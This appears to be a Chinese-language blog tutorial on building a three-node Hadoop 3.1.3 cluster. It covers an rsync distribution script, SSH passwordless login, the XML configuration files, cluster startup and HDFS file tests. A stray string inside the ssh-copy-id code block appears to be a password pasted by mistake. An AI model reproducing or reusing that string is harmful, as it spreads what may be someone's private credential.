<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">1. 判断参数个数</span> </span><br><span class="line">if [ $# -lt 1 ] </span><br><span class="line">then</span><br><span class="line">		echo Not Enough Arguement!</span><br><span class="line">		exit; </span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="language-bash">2. 遍历集群所有机器</span></span><br><span class="line">for host in hadoop102 hadoop103 hadoop104 </span><br><span class="line">do</span><br><span class="line">	echo ==================== $host ==================== </span><br><span class="line"><span class="meta">	#</span><span class="language-bash">3. 遍历所有目录，挨个发送</span></span><br><span class="line">  for file in $@</span><br><span class="line">  do</span><br><span class="line"><span class="meta">		#</span><span class="language-bash">4. 判断文件是否存在</span> </span><br><span class="line">		if [ -e $file ]</span><br><span class="line">		then</span><br><span class="line">				#5. 获取父目录</span><br><span class="line">				pdir=$(cd -P $(dirname $file); pwd)</span><br><span class="line">				#6. 获取当前文件的名称 </span><br><span class="line">				fname=$(basename $file)</span><br><span class="line">				ssh $host &quot;mkdir -p $pdir&quot;</span><br><span class="line">				rsync -av $pdir/$fname $host:$pdir</span><br><span class="line">    else</span><br><span class="line">        echo $file does not exists!</span><br><span class="line">		fi </span><br><span class="line">	done</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h4 id="分发环境变量"><a href="#分发环境变量" class="headerlink" title="分发环境变量"></a>分发环境变量</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">修改脚本xsync具有执行权限</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x xsync </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">将脚本复制到/bin，以便全局调用</span></span><br><span class="line">[huang@hadoop102 bin]$ sudo cp xsync /bin/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">如果用了sudo，那么xsync一定要给它的路径补全</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">同步环境变量配置（root所有者）</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo ./bin/xsync /etc/profile.d/my_env.sh </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">让环境变量生效</span></span><br><span class="line">[huang@hadoop102 ~]$ ssh huang@hadoop103</span><br><span class="line">[huang@hadoop103 ~]$ source /etc/profile</span><br><span class="line">[huang@hadoop103 ~]$ ssh huang@hadoop104</span><br><span class="line">[huang@hadoop104 ~]$ source /etc/profile</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="SSH无密码登陆配置"><a href="#SSH无密码登陆配置" class="headerlink" title="SSH无密码登陆配置"></a>SSH无密码登陆配置</h3><h4 id="免密码登陆原理"><a href="#免密码登陆原理" class="headerlink" title="免密码登陆原理"></a>免密码登陆原理</h4><p><strong>1.通常的ssh密码登陆过程</strong></p>
<ul>
<li>用户向所要登陆的远程主机发送登陆请求</li>
<li>远程主机收到用户的登录请求，把自己的公钥发送给用户</li>
<li>用户使用这个公钥，将登陆密码加密后，发送给远程主机</li>
<li>远程主机用自己的私钥，解密登陆密码，如果密码正确，就同意用户登陆</li>
</ul>
<p>在linux中，如果第一次通过ssh登陆远程主机，会出现以下提示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ ssh huang@hadoop103</span><br><span class="line">The authenticity of host &#x27;hadoop103 (10.211.55.5)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:wsBGThjnNNKRLdb8nms49AJFfnTt6erg5jHj4bCXm40.</span><br><span class="line">ECDSA key fingerprint is MD5:93:ee:77:88:bc:7a:ed:0a:3d:d6:62:ce:95:38:be:05.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br></pre></td></tr></table></figure>

<p>这段话的意思是，无法确认host主机的真实性，公钥指纹和MD5可能会被中间人攻击替换，问你还想继续吗？</p>
<p>所谓的“公钥指纹”，是指公钥长度较长（这里采用RSA算法，长达1024位），很难比对，所以对其进行MD5计算，将他变成128位的指纹。上列中是93:ee:77:88:bc:7a:ed:0a:3d:d6:62:ce:95:38:be:05.再进行比较，就容易多了。</p>
<p>假定经过风险衡量以后，用户决定接受这个远程主机的公钥。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Are you sure you want to continue connecting (yes/no)?yes</span><br></pre></td></tr></table></figure>

<p>系统会出现一句提示，表示host主机已经得到认可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Warning: Permanently added &#x27;host,12.18.429.21&#x27; (RSA) to the list of known hosts.</span><br></pre></td></tr></table></figure>

<p>然后，会要求输入密码。</p>
<p>如果密码正确，就可以登录了。</p>
<p>当远程主机的公钥被接受以后，它就会被保存在用户home目录的$HOME&#x2F;.ssh&#x2F;known_hosts文件之中。下次再连接这台远程主机，系统就会认出它的公钥已经保存在本地了，从而跳过警告部分，直接提示输入密码。</p>
<p>如果远程主机重新装过系统或因为别的原因，导致ssh指纹改变，需要把.ssh目录下的know_hosts文件中相应远程主机IP一致的指纹删除，再通过ssh登录一次回答yes，重新认证一次方可登录。注意.ssh是目录是以“.”开头的隐藏目录，需要#ls -a参数才能看到。而且这个目录的权限必须是700，并且用户的home目录也不能给其他用户写权限，否则ssh服务器会拒绝登录。如果发生不能登录的问题，可以查看服务器上的日志文件&#x2F;var&#x2F;log&#x2F;secure。</p>
<p><strong>2.公钥登陆（免密码登陆）</strong></p>
<p>A服务器想要无密码登陆B服务器的话，得把自己的公钥给B，B如果想让A无密码登陆就认可A的公钥，这样A的发送的指令不保密（因为公钥是公开的），但是B返回的结果只有A能解开</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220046874.png" alt="image-20210628003617469"></p>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">生成公钥和私钥</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /home/huang/.ssh/</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-keygen -t rsa</span><br><span class="line"><span class="meta">#</span><span class="language-bash">按三下回车就会生成rsa文件</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">将公钥拷贝到要免密登陆的目标机器上</span></span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop102</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop103</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop104</span><br><span class="line"></span><br><span class="line">ycbaby000623</span><br></pre></td></tr></table></figure>

<ul>
<li><p>还需要在 hadoop103 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104 服务器上。</p>
</li>
<li><p>还需要在 hadoop104 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104 服务器上。</p>
</li>
<li><p>还需要在 hadoop102 上采用 root 账号，配置一下无密登录到 hadoop102、hadoop103、 hadoop104;</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@hadoop102 .ssh]# ll</span><br><span class="line">总用量 16</span><br><span class="line">-rw-------. 1 root root  396 6月  28 00:51 authorized_keys</span><br><span class="line">-rw-------. 1 root root 1679 6月  28 00:50 id_rsa</span><br><span class="line">-rw-r--r--. 1 root root  396 6月  28 00:50 id_rsa.pub</span><br><span class="line">-rw-r--r--. 1 root root  549 6月  28 00:30 known_hosts</span><br></pre></td></tr></table></figure>

<ul>
<li>Known_hosts: 记录ssh访问过计算机的公钥（public key）</li>
<li>id_rsa: 生成的私钥</li>
<li>id_rsa.pub: 生成的公钥</li>
<li>authorized_keys: 存放授权过的无密码登录服务器公钥，授权过的服务器可以无密码访问本服务器</li>
</ul>
<h3 id="集群配置"><a href="#集群配置" class="headerlink" title="集群配置"></a>集群配置</h3><h4 id="集群规划"><a href="#集群规划" class="headerlink" title="集群规划"></a>集群规划</h4><ul>
<li>NameNode和SecondaryNameNode 不要安装在同一台服务器上</li>
<li>ResourceManage很消耗内存，最好不要和NameNode，SecondaryNameNode配置在同一台机器上</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220046885.png" alt="image-20210628012056622"></p>
<h4 id="配置文件说明"><a href="#配置文件说明" class="headerlink" title="配置文件说明"></a>配置文件说明</h4><p>Hadoop 配置文件分两类:默认配置文件和自定义配置文件，只有用户想修改某一默认</p>
<p>配置值时，才需要修改自定义配置文件，更改相应属性值。</p>
<h5 id="默认配置文件"><a href="#默认配置文件" class="headerlink" title="默认配置文件"></a>默认配置文件</h5><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220049179.png" alt="image-20210628012641270"></p>
<h5 id="自定义配置文件"><a href="#自定义配置文件" class="headerlink" title="自定义配置文件"></a>自定义配置文件</h5><p><strong>core-site.xml</strong>、<strong>hdfs-site.xml</strong>、<strong>yarn-site.xml</strong>、<strong>mapred-site.xml</strong> 四个配置文件存放在 $HADOOP_HOME&#x2F;etc&#x2F;hadoop 这个路径上，用户可以根据项目需求重新进行修改配置。</p>
<h4 id="配置集群"><a href="#配置集群" class="headerlink" title="配置集群"></a>配置集群</h4><h5 id="核心配置文件"><a href="#核心配置文件" class="headerlink" title="核心配置文件"></a>核心配置文件</h5><p>配置core-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd $HADOOP_HOME/etc/hadoop</span><br><span class="line">[huang@hadoop102 hadoop]$ vi core-site.xml </span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 NameNode 的地址 --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://hadoop102:8020<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 hadoop 数据的存储目录 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/opt/module/hadoop-3.1.3/data<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 配置 HDFS 网页登录使用的静态用户为 huang --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.http.staticuser.user<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>huang<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="HDFS配置文件"><a href="#HDFS配置文件" class="headerlink" title="HDFS配置文件"></a>HDFS配置文件</h5><p>配置hdfs-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ vi hdfs-site.xml </span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- nn web端访问地址--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.http-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:9870<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 2nn web 端访问地址--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.secondary.http-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop104:9868<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="YARN配置文件"><a href="#YARN配置文件" class="headerlink" title="YARN配置文件"></a>YARN配置文件</h5><p>配置yarn-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ vi yarn-site.xml </span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 MR 走 shuffle --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 ResourceManager 的地址--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.hostname<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop103<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 环境变量的继承 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.env-whitelist<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>JAVA_HOME,HADOOP_COMMON_HOME,HADOOP_HDFS_HOME,HADOOP_CONF_DIR,CLASSPATH_PREPEND_DISTCACHE,HADOOP_YARN_HOME,HADOOP_MAP RED_HOME<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="MapReduce配置文件"><a href="#MapReduce配置文件" class="headerlink" title="MapReduce配置文件"></a>MapReduce配置文件</h5><p>配置mapred-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ vi mapred-site.xml </span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 指定 MapReduce 程序运行在 Yarn 上 --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.framework.name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>yarn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.app.mapreduce.am.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.map.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.reduce.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="集群分发"><a href="#集群分发" class="headerlink" title="集群分发"></a>集群分发</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">分发Hadoop</span></span><br><span class="line">[huang@hadoop102 hadoop]$ xsync /opt/module/hadoop-3.1.3/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">分发jdk</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ xsync /opt/module/jdk1.8.0_212/</span><br></pre></td></tr></table></figure>

<h4 id="去hadoop103和hadoop104上查看分发情况"><a href="#去hadoop103和hadoop104上查看分发情况" class="headerlink" title="去hadoop103和hadoop104上查看分发情况"></a>去hadoop103和hadoop104上查看分发情况</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ ssh hadoop103</span><br><span class="line">Last failed login: Mon Jun 28 00:48:32 CST 2021 from hadoop103 on ssh:notty</span><br><span class="line">There was 1 failed login attempt since the last successful login.</span><br><span class="line">Last login: Mon Jun 28 00:47:23 2021 from hadoop102</span><br><span class="line">[huang@hadoop103 ~]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line"></span><br><span class="line">[huang@hadoop103 hadoop-3.1.3]$ ssh hadoop104</span><br><span class="line">Last login: Mon Jun 28 00:49:13 2021 from hadoop103</span><br><span class="line">[huang@hadoop104 ~]$ cat /opt/module/hadoop-3.1.3/etc/hadoop/core-site.xml </span><br></pre></td></tr></table></figure>



<h3 id="群起集群"><a href="#群起集群" class="headerlink" title="群起集群"></a>群起集群</h3><h4 id="配置workers"><a href="#配置workers" class="headerlink" title="配置workers"></a>配置workers</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">该文件中不允许出现空格，结尾也不行</span></span><br><span class="line">[huang@hadoop102 ~]$ vi /opt/module/hadoop-3.1.3/etc/hadoop/workers </span><br><span class="line">hadoop102</span><br><span class="line">hadoop103</span><br><span class="line">hadoop104</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">同步所有节点配置文件</span></span><br><span class="line">[huang@hadoop102 ~]$ xsync /opt/module/hadoop-3.1.3/etc/</span><br><span class="line">==================== hadoop102 ====================</span><br><span class="line">sending incremental file list</span><br><span class="line"></span><br><span class="line">sent 1,014 bytes  received 19 bytes  688.67 bytes/sec</span><br><span class="line">total size is 107,680  speedup is 104.24</span><br><span class="line">==================== hadoop103 ====================</span><br><span class="line">sending incremental file list</span><br><span class="line">etc/hadoop/</span><br><span class="line">etc/hadoop/workers</span><br><span class="line"></span><br><span class="line">sent 1,094 bytes  received 51 bytes  2,290.00 bytes/sec</span><br><span class="line">total size is 107,680  speedup is 94.04</span><br><span class="line">==================== hadoop104 ====================</span><br><span class="line">sending incremental file list</span><br><span class="line">etc/hadoop/</span><br><span class="line">etc/hadoop/workers</span><br><span class="line"></span><br><span class="line">sent 1,094 bytes  received 51 bytes  2,290.00 bytes/sec</span><br><span class="line">total size is 107,680  speedup is 94.04</span><br></pre></td></tr></table></figure>

<h4 id="启动集群"><a href="#启动集群" class="headerlink" title="启动集群"></a>启动集群</h4><p>1.如果集群是第一次启动，需要在hadoop102节点格式化NameNode(注意:格式化 NameNode，会产生新的集群 id，导致 NameNode 和 DataNode 的集群 id 不一致，集群找不到已往数据。如果集群在运行过程中报错，需要重新格式化 NameNode 的话，<strong>一定要先停 止 NameNode 和 DataNode 进程，并且要删除所有机器的 data 和 logs 目录，然后再进行格式化</strong>。)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hdfs namenode -format</span><br></pre></td></tr></table></figure>

<p>2.启动HDFS</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ sbin/start-dfs.sh</span><br></pre></td></tr></table></figure>

<p>3.在配置了ResourceManage的节点（hadoop103）启动yarn</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ssh hadoop103</span><br><span class="line">Last login: Mon Jun 28 02:29:59 2021 from hadoop102</span><br><span class="line">[huang@hadoop103 ~]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop103 hadoop-3.1.3]$ sbin/start-yarn.sh </span><br></pre></td></tr></table></figure>

<p>4.Web 端查看 HDFS 的 NameNode</p>
<ul>
<li><p>浏览器中输入:<a href="http://hadoop102:9870/">http://hadoop102:9870</a></p>
</li>
<li><p>查看 HDFS 上存储的数据信息</p>
</li>
</ul>
<p>5.Web 端查看 YARN 的 ResourceManager</p>
<ul>
<li><p>浏览器中输入:<a href="http://hadoop103:8088/">http://hadoop103:8088</a></p>
</li>
<li><p>查看 YARN 上运行的 Job 信息</p>
</li>
</ul>
<h4 id="集群测试"><a href="#集群测试" class="headerlink" title="集群测试"></a>集群测试</h4><h5 id="上传文件到集群"><a href="#上传文件到集群" class="headerlink" title="上传文件到集群"></a>上传文件到集群</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">小文件</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd wcinput/</span><br><span class="line">[huang@hadoop102 wcinput]$ vi word.txt</span><br><span class="line">[huang@hadoop102 wcinput]$ hadoop fs -mkdir /input</span><br><span class="line">[huang@hadoop102 wcinput]$ hadoop fs -put /opt/module/hadoop-3.1.3/wcinput/word.txt /input</span><br><span class="line">2021-06-28 12:15:59,028 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">大文件</span></span><br><span class="line">[huang@hadoop102 wcinput]$ hadoop fs -put /opt/software/jdk-8u212-linux-x64.tar.gz /</span><br><span class="line">2021-06-28 12:16:44,297 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">2021-06-28 12:16:46,064 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br></pre></td></tr></table></figure>

<h5 id="上传文件后查看文件存放在什么位置"><a href="#上传文件后查看文件存放在什么位置" class="headerlink" title="上传文件后查看文件存放在什么位置"></a>上传文件后查看文件存放在什么位置</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 wcinput]$ cd /opt/module/hadoop-3.1.3/data/dfs/data/current/BP-1650407707-10.211.55.4-1624852380753/current/finalized/subdir0/subdir0/</span><br><span class="line">[huang@hadoop102 subdir0]$ ll</span><br><span class="line">总用量 191944</span><br><span class="line">-rw-rw-r--. 1 huang huang        64 6月  28 12:15 blk_1073741825</span><br><span class="line">-rw-rw-r--. 1 huang huang        11 6月  28 12:15 blk_1073741825_1001.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang 134217728 6月  28 12:16 blk_1073741826</span><br><span class="line">-rw-rw-r--. 1 huang huang   1048583 6月  28 12:16 blk_1073741826_1002.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang  60795424 6月  28 12:16 blk_1073741827</span><br><span class="line">-rw-rw-r--. 1 huang huang    474975 6月  28 12:16 blk_1073741827_1003.meta</span><br><span class="line">[huang@hadoop102 subdir0]$ cat blk_1073741825</span><br><span class="line">hello hadoop</span><br><span class="line">hadoop huangmingwang</span><br><span class="line">huang ming wang</span><br><span class="line">hadoop hello</span><br></pre></td></tr></table></figure>

<h5 id="拼接文件"><a href="#拼接文件" class="headerlink" title="拼接文件"></a>拼接文件</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 subdir0]$ cat blk_1073741826 &gt;&gt; tmp.tar.gz</span><br><span class="line">[huang@hadoop102 subdir0]$ cat blk_1073741827 &gt;&gt; tmp.tar.gz</span><br><span class="line">[huang@hadoop102 subdir0]$ tar -zxvf tmp.tar.gz </span><br><span class="line"></span><br><span class="line">[huang@hadoop102 subdir0]$ ll</span><br><span class="line">总用量 382392</span><br><span class="line">-rw-rw-r--. 1 huang huang        64 6月  28 12:15 blk_1073741825</span><br><span class="line">-rw-rw-r--. 1 huang huang        11 6月  28 12:15 blk_1073741825_1001.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang 134217728 6月  28 12:16 blk_1073741826</span><br><span class="line">-rw-rw-r--. 1 huang huang   1048583 6月  28 12:16 blk_1073741826_1002.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang  60795424 6月  28 12:16 blk_1073741827</span><br><span class="line">-rw-rw-r--. 1 huang huang    474975 6月  28 12:16 blk_1073741827_1003.meta</span><br><span class="line">drwxr-xr-x. 7 huang huang      4096 4月   2 2019 jdk1.8.0_212</span><br><span class="line">-rw-rw-r--. 1 huang huang 195013152 6月  28 12:23 tmp.tar.gz</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /opt/software/</span><br><span class="line">[huang@hadoop102 software]$ rm -rf jdk-8u212-linux-x64.tar.gz </span><br><span class="line">[huang@hadoop102 software]$ ll</span><br><span class="line">总用量 330156</span><br><span class="line">-rw-rw-r--. 1 huang huang 338075860 6月  28 00:11 hadoop-3.1.3.tar.gz</span><br><span class="line">[huang@hadoop102 software]$ hadoop fs -get /jdk-8u212-linux-x64.tar.gz ./</span><br><span class="line">2021-06-28 12:28:24,662 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">[huang@hadoop102 software]$ ll</span><br><span class="line">总用量 520600</span><br><span class="line">-rw-rw-r--. 1 huang huang 338075860 6月  28 00:11 hadoop-3.1.3.tar.gz</span><br><span class="line">-rw-r--r--. 1 huang huang 195013152 6月  28 12:28 jdk-8u212-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>

